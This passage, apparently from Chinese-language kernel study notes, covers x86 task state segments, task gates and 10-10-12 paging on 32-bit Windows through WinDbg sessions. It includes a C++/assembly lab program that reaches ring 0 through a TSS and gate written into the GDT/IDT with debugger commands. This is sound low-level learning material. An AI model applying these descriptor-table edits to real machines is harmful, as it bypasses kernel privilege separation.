class=\"number\">0x12ff44</span></span><br><span class=\"line\">   +<span class=\"number\">0x040</span> Esi              : <span class=\"number\">0x6e49cbe3</span></span><br><span class=\"line\">   +<span class=\"number\">0x044</span> Edi              : <span class=\"number\">0x409430</span></span><br><span class=\"line\">   +<span class=\"number\">0x048</span> Es               : <span class=\"number\">0x23</span></span><br><span class=\"line\">   +<span class=\"number\">0x04a</span> Reserved2        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x04c</span> Cs               : <span class=\"number\">0x1b</span></span><br><span class=\"line\">   +<span class=\"number\">0x04e</span> Reserved3        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x050</span> Ss               : <span class=\"number\">0x23</span></span><br><span class=\"line\">   +<span class=\"number\">0x052</span> Reserved4        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x054</span> Ds               : <span class=\"number\">0x23</span></span><br><span class=\"line\">   +<span class=\"number\">0x056</span> Reserved5        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x058</span> Fs               : <span class=\"number\">0x3b</span></span><br><span class=\"line\">   +<span class=\"number\">0x05a</span> Reserved6        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05c</span> Gs               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05e</span> Reserved7        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x060</span> LDT              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x062</span> Reserved8        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x064</span> Flags            : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x066</span> IoMapBase        : <span class=\"number\">0x20ac</span></span><br><span class=\"line\">   +<span class=\"number\">0x068</span> IoMaps           : [<span class=\"number\">1</span>] _KiIoAccessMap</span><br><span class=\"line\">   +<span class=\"number\">0x208c</span> IntDirectionMap  : [<span class=\"number\">32</span>]  <span class=\"string\">&quot;???&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dg <span class=\"number\">48</span></span><br><span class=\"line\">                                  P Si Gr Pr Lo</span><br><span class=\"line\">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class=\"line\">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class=\"line\"><span class=\"number\">0048</span> <span class=\"number\">00403378</span> <span class=\"number\">00000100</span> TSS32 Busy <span class=\"number\">3</span> Nb By P  Nl <span class=\"number\">000000</span>eb</span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt _KTSS <span class=\"number\">00403378</span> </span><br><span class=\"line\">ntdll!_KTSS</span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Backlink         : <span class=\"number\">0x28</span></span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Reserved0        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x004</span> Esp0             : <span class=\"number\">0x407418</span></span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Ss0              : <span class=\"number\">0x10</span></span><br><span class=\"line\">   +<span class=\"number\">0x00a</span> Reserved1        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> NotUsed1         : [<span class=\"number\">4</span>] <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> CR3              : <span class=\"number\">0x1e033000</span></span><br><span class=\"line\">   +<span class=\"number\">0x020</span> Eip              : <span class=\"number\">0x401000</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> EFlags           : <span class=\"number\">2</span></span><br><span class=\"line\">   +<span class=\"number\">0x028</span> Eax              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> Ecx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x030</span> Edx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x034</span> Ebx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x038</span> Esp              : <span class=\"number\">0x409418</span></span><br><span class=\"line\">   +<span class=\"number\">0x03c</span> Ebp              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x040</span> Esi              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x044</span> Edi              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x048</span> Es               : <span class=\"number\">0x23</span></span><br><span class=\"line\">   +<span class=\"number\">0x04a</span> Reserved2        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x04c</span> Cs               : <span class=\"number\">8</span></span><br><span class=\"line\">   +<span class=\"number\">0x04e</span> Reserved3        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x050</span> Ss               : <span class=\"number\">0x10</span></span><br><span class=\"line\">   +<span class=\"number\">0x052</span> Reserved4        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x054</span> Ds               : <span class=\"number\">0x23</span></span><br><span class=\"line\">   +<span class=\"number\">0x056</span> Reserved5        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x058</span> Fs               : <span class=\"number\">0x30</span></span><br><span class=\"line\">   +<span class=\"number\">0x05a</span> Reserved6        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05c</span> Gs               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05e</span> Reserved7        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x060</span> LDT              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x062</span> Reserved8        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x064</span> Flags            : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x066</span> IoMapBase        : <span class=\"number\">0x20ac</span></span><br><span class=\"line\">   +<span class=\"number\">0x068</span> IoMaps           : [<span class=\"number\">1</span>] _KiIoAccessMap</span><br><span class=\"line\">   +<span class=\"number\">0x208c</span> IntDirectionMap  : [<span class=\"number\">32</span>]  <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; r esp </span><br><span class=\"line\">esp=<span class=\"number\">00409418</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">efl=<span class=\"number\">00004002</span>\t\t\t任务嵌套</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 手工修复CR3</span></span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; r tr </span><br><span class=\"line\">tr=<span class=\"number\">00000028</span></span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; dg <span class=\"number\">28</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">                                  P Si Gr Pr Lo</span><br><span class=\"line\">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class=\"line\">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class=\"line\"><span class=\"number\">0028</span> <span class=\"number\">807</span>cd750 <span class=\"number\">000020</span>ab TSS32 Busy <span class=\"number\">0</span> Nb By P  Nl <span class=\"number\">0000008b</span></span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; dt _KTSS <span class=\"number\">807</span>cd750 </span><br><span class=\"line\">ntdll!_KTSS</span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Backlink         : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Reserved0        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x004</span> Esp0             : <span class=\"number\">0x807e6cb0</span></span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Ss0              : <span class=\"number\">0x10</span></span><br><span class=\"line\">   +<span class=\"number\">0x00a</span> Reserved1        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> NotUsed1         : [<span class=\"number\">4</span>] <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> CR3              : <span class=\"number\">0</span></span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; ed <span class=\"number\">807</span>cd750+<span class=\"number\">1</span>c <span class=\"number\">3e876600</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// renwuduan.cpp : 定义控制台应用程序的入口点。</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KiIoAccessMap</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUCHAR DirectionMap[<span class=\"number\">32</span>];                                                 <span class=\"comment\">//0x0</span></span><br><span class=\"line\">\tUCHAR IoMap[<span class=\"number\">8196</span>];                                                      <span class=\"comment\">//0x20</span></span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTSS</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUSHORT Backlink;                                                        <span class=\"comment\">//0x0</span></span><br><span class=\"line\">\tUSHORT Reserved0;                                                       <span class=\"comment\">//0x2</span></span><br><span class=\"line\">\tULONG Esp0;                                                             <span class=\"comment\">//0x4</span></span><br><span class=\"line\">\tUSHORT Ss0;                                                             <span class=\"comment\">//0x8</span></span><br><span class=\"line\">\tUSHORT Reserved1;                                                       <span class=\"comment\">//0xa</span></span><br><span class=\"line\">\tULONG NotUsed1[<span class=\"number\">4</span>];                                                      <span class=\"comment\">//0xc</span></span><br><span class=\"line\">\tULONG CR3;                                                              <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">\tULONG Eip;                                                              <span class=\"comment\">//0x20</span></span><br><span class=\"line\">\tULONG EFlags;                                                           <span class=\"comment\">//0x24</span></span><br><span class=\"line\">\tULONG Eax;                                                              <span class=\"comment\">//0x28</span></span><br><span class=\"line\">\tULONG Ecx;                                                              <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">\tULONG Edx;                                                              <span class=\"comment\">//0x30</span></span><br><span class=\"line\">\tULONG Ebx;                                                              <span class=\"comment\">//0x34</span></span><br><span class=\"line\">\tULONG Esp;                                                              <span class=\"comment\">//0x38</span></span><br><span class=\"line\">\tULONG Ebp;                                                              <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">\tULONG Esi;                                                              <span class=\"comment\">//0x40</span></span><br><span class=\"line\">\tULONG Edi;                                                              <span class=\"comment\">//0x44</span></span><br><span class=\"line\">\tUSHORT Es;                                                              <span class=\"comment\">//0x48</span></span><br><span class=\"line\">\tUSHORT Reserved2;                                                       <span class=\"comment\">//0x4a</span></span><br><span class=\"line\">\tUSHORT Cs;                                                              <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">\tUSHORT Reserved3;                                                       <span class=\"comment\">//0x4e</span></span><br><span class=\"line\">\tUSHORT Ss;                                                              <span class=\"comment\">//0x50</span></span><br><span class=\"line\">\tUSHORT Reserved4;                                                       <span class=\"comment\">//0x52</span></span><br><span class=\"line\">\tUSHORT Ds;                                                              <span class=\"comment\">//0x54</span></span><br><span class=\"line\">\tUSHORT Reserved5;                                                       <span class=\"comment\">//0x56</span></span><br><span class=\"line\">\tUSHORT Fs;                                                              <span class=\"comment\">//0x58</span></span><br><span class=\"line\">\tUSHORT Reserved6;                                                       <span class=\"comment\">//0x5a</span></span><br><span class=\"line\">\tUSHORT Gs;                                                              <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">\tUSHORT Reserved7;                                                       <span class=\"comment\">//0x5e</span></span><br><span class=\"line\">\tUSHORT LDT;                                                             <span class=\"comment\">//0x60</span></span><br><span class=\"line\">\tUSHORT Reserved8;                                                       <span class=\"comment\">//0x62</span></span><br><span class=\"line\">\tUSHORT Flags;                                                           <span class=\"comment\">//0x64</span></span><br><span class=\"line\">\tUSHORT IoMapBase;                                                       <span class=\"comment\">//0x66</span></span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> <span class=\"title class_\">_KiIoAccessMap</span> IoMaps[<span class=\"number\">1</span>];                                        <span class=\"comment\">//0x68</span></span><br><span class=\"line\">\tUCHAR IntDirectionMap[<span class=\"number\">32</span>];                                              <span class=\"comment\">//0x208c</span></span><br><span class=\"line\">&#125;KTSS,*PKTSS;; </span><br><span class=\"line\"></span><br><span class=\"line\">KTSS tss = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> bufesp0[<span class=\"number\">0x2000</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">char</span> bufesp3[<span class=\"number\">0x2000</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">test</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\tpushfd\t\t<span class=\"comment\">// repair eflag</span></span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t\t<span class=\"keyword\">or</span> eax,<span class=\"number\">0x4000</span></span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">short</span> trxx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tstr trxx    <span class=\"comment\">// get segment descriptor  = 0x28</span></span><br><span class=\"line\">\t\tltr trxx    <span class=\"comment\">// edit tr ,ring 3 no privilege</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(bufesp0,<span class=\"number\">0</span>,<span class=\"number\">0x02000</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(bufesp3,<span class=\"number\">0</span>,<span class=\"number\">0x02000</span>);</span><br><span class=\"line\">\ttss.Esp0 = (ULONG)bufesp0 + <span class=\"number\">0x1ff0</span>;  <span class=\"comment\">//堆栈是从下往上分配的，所以需要分配到堆栈最底段</span></span><br><span class=\"line\">\ttss.Esp = (ULONG)bufesp3 + <span class=\"number\">0x1ff0</span>;</span><br><span class=\"line\">\ttss.Ss0 = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\ttss.Ss = <span class=\"number\">0x10</span>;\t\t\t<span class=\"comment\">// 提权 </span></span><br><span class=\"line\">\ttss.Cs = <span class=\"number\">0x8</span>;</span><br><span class=\"line\">\ttss.Ds = <span class=\"number\">0x23</span>;</span><br><span class=\"line\">\ttss.Es = <span class=\"number\">0x23</span>;</span><br><span class=\"line\">\ttss.Fs = <span class=\"number\">0x30</span>;</span><br><span class=\"line\">\ttss.EFlags = <span class=\"number\">0x2</span>;</span><br><span class=\"line\">\ttss.Eip = (ULONG)test;</span><br><span class=\"line\">\ttss.IoMapBase = <span class=\"number\">0x20ac</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;cr3\\r\\n&quot;</span>);</span><br><span class=\"line\">\tDWORD dwcr3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%x&quot;</span>,&amp;dwcr3);</span><br><span class=\"line\">\ttss.CR3 = dwcr3;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\r\\n&quot;</span>,&amp;tss);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> bufcode[] = &#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x68</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr bufcode</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>CPU 中最小执行单元叫做任务，操作系统中叫做线程</p>\n<p>一个进程本质来说就是一个任务，在 CPU 看来</p>\n<p>任务本质上就是切换寄存器</p>\n<p>64 位任务段被废弃，作为别的用处</p>\n<p>int 3 把 nt 清了，导致无法返回</p>\n<p>iretd 首先检测 NT 为，如果等于 0 就按照堆栈返回</p>\n<p>如果 NT=1，就按照 backlink 找到要回去的上下文环境</p>\n<h3 id=\"任务门\"><a class=\"markdownIt-Anchor\" href=\"#任务门\">#</a> 任务门</h3>\n<p>gdtr 中 10 和 40 都是任务门</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1827556-20200307193208249-33161271.png\" alt=\"img\"></p>\n<p>type = 5</p>\n<p>TSS S S = 任务段段选择子</p>\n<p>int 8 双重异常！idt 8</p>\n<p>task selector = 0x50</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; !idt 8</span><br><span class=\"line\"></span><br><span class=\"line\">Dumping IDT: 80b99400</span><br><span class=\"line\"></span><br><span class=\"line\">bfe94bd900000008:\tTask Selector = 0x0050</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dg 50</span><br><span class=\"line\">                                  P Si Gr Pr Lo</span><br><span class=\"line\">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class=\"line\">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class=\"line\">0050 83f40000 00000068 TSS32 Avl  0 Nb By P  Nl 00000089</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dt _KTSS 83f40000 </span><br><span class=\"line\">nt!_KTSS</span><br><span class=\"line\">   +0x000 Backlink         : 0</span><br><span class=\"line\">   +0x002 Reserved0        : 0</span><br><span class=\"line\">   +0x004 Esp0             : 0x83f3d000</span><br><span class=\"line\">   +0x008 Ss0              : 0x10</span><br><span class=\"line\">   +0x00a Reserved1        : 0</span><br><span class=\"line\">   +0x00c NotUsed1         : [4] 0</span><br><span class=\"line\">   +0x01c CR3              : 0x185000</span><br><span class=\"line\">   +0x020 Eip              : 0x83e57357</span><br><span class=\"line\">   +0x024 EFlags           : 0</span><br><span class=\"line\">   +0x028 Eax              : 0</span><br><span class=\"line\">   +0x02c Ecx              : 0</span><br><span class=\"line\">   +0x030 Edx              : 0</span><br><span class=\"line\">   +0x034 Ebx              : 0</span><br><span class=\"line\">   +0x038 Esp              : 0x83f3d000</span><br><span class=\"line\">   +0x03c Ebp              : 0</span><br><span class=\"line\">   +0x040 Esi              : 0</span><br><span class=\"line\">   +0x044 Edi              : 0</span><br><span class=\"line\">   +0x048 Es               : 0x23</span><br><span class=\"line\">   +0x04a Reserved2        : 0</span><br><span class=\"line\">   +0x04c Cs               : 8</span><br><span class=\"line\">   +0x04e Reserved3        : 0</span><br><span class=\"line\">   +0x050 Ss               : 0x10</span><br><span class=\"line\">   +0x052 Reserved4        : 0</span><br><span class=\"line\">   +0x054 Ds               : 0x23</span><br><span class=\"line\">   +0x056 Reserved5        : 0</span><br><span class=\"line\">   +0x058 Fs               : 0x30</span><br><span class=\"line\">   +0x05a Reserved6        : 0</span><br><span class=\"line\">   +0x05c Gs               : 0</span><br><span class=\"line\">   +0x05e Reserved7        : 0</span><br><span class=\"line\">   +0x060 LDT              : 0</span><br><span class=\"line\">   +0x062 Reserved8        : 0</span><br><span class=\"line\">   +0x064 Flags            : 0</span><br><span class=\"line\">   +0x066 IoMapBase        : 0x20ac</span><br><span class=\"line\">   +0x068 IoMaps           : [1] _KiIoAccessMap</span><br><span class=\"line\">   +0x208c IntDirectionMap  : [32]  &quot;???&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">// 代码和上节课一样</span><br><span class=\"line\"></span><br><span class=\"line\">eq 80b99048 0000e940`50300100       // 48</span><br><span class=\"line\"></span><br><span class=\"line\">eq 807d3120  0000e500`00480000      // int 32</span><br><span class=\"line\"></span><br><span class=\"line\">1: kd&gt; ed 807cd750+1c 3e876580      // 修复dg 28的cr3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">80b99040</span><br></pre></td></tr></table></figure>\n<h3 id=\"配置101012\"><a class=\"markdownIt-Anchor\" href=\"#配置101012\">#</a> 配置 101012</h3>\n<p>CR4 中有 PAE，导致分页为 29912，29912 的 CR3 最后两位为 20 的倍数</p>\n<p>1. 添加新条目</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231015211644175.png\" alt=\"image-20231015211644175\"></p>\n<p>2. 高级设置</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231015211718524.png\" alt=\"image-20231015211718524\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231015211727770.png\" alt=\"image-20231015211727770\"></p>\n<p>配置后 dirbase 都应该是 000 结尾，以 1k 为单位</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231015211843834.png\" alt=\"image-20231015211843834\"></p>\n<p>32 位下有两种分页模式  29912 101012    64 位有 999912</p>\n<p>ntoskrnl 101012 对应页表内核</p>\n<p>ntkrnlpa 29912d 对应页表内核</p>\n<p>虚拟内存</p>\n<p>32 位 一个进程有自己的 4GB 空间，因为指针宽度是 32 位，寻址是 2^32</p>\n<p>4GB 是虚拟内存，和真实物理内存没有联系</p>\n<p>0018e0b0</p>\n<p>10 (PDE)   10 (PTE)   12（页内偏移）\t\tpage director element    page table element</p>\n<p>0000 0000 0000         0001 1000 1110          0000 1011 0000（页内偏移）   注意前面的两位 00 是需要补上去的，这样 10+2=12</p>\n<p>0\t\t\t\t\t\t\t\t\t18e\t\t\t\t\t\t\t\t0b0</p>\n<p>CR3 页表查询起始地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!dd  // 查看物理地址</span><br><span class=\"line\">!dd 50601000(CR3)</span><br><span class=\"line\"></span><br><span class=\"line\">!dd 50601000 + 0*4    // 拿到第一项，把最后三位清零  56457867 -&gt; 56457000</span><br><span class=\"line\">!dd 56457000 + 18e*4   // 58073867 -&gt; 58073000</span><br><span class=\"line\">!dd 58073000 + 0b0\t   // 0b0 是页内偏移  物理地址</span><br></pre></td></tr></table></figure>\n<p>CR3 中每一个元素都是 PDE</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231018174920595.png\" alt=\"image-20231018174920595\"></p>\n<p>PTT 中可能没有挂物理页，此时 PTE 中为 NULL</p>\n<p><code>1024*1024*4 = 4M</code>  只需要 4m 就能管理 4G</p>\n<p>一个进程实际只有 2G , 高地址的 2G 是所有进程共享的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231018180122932.png\" alt=\"image-20231018180122932\"></p>\n<p>intel 和 amd 最小页是 4k</p>\n<p>Windows 64k</p>\n<p>0-0x10000 和 0x7fff000 - 0x7fffffff 不能访问。前一个是 NULL 区，后一个是隔离区</p>\n<p>从 0x8000000 到 0xfffffff 没有保留区域</p>\n<p>CPU 中是通过 MMU 寻址。MMU 是一个寻址模块</p>\n<p>MMU 寻址时</p>\n<p>1. 把线性地址 右移 12 位</p>\n<p>2.TLB 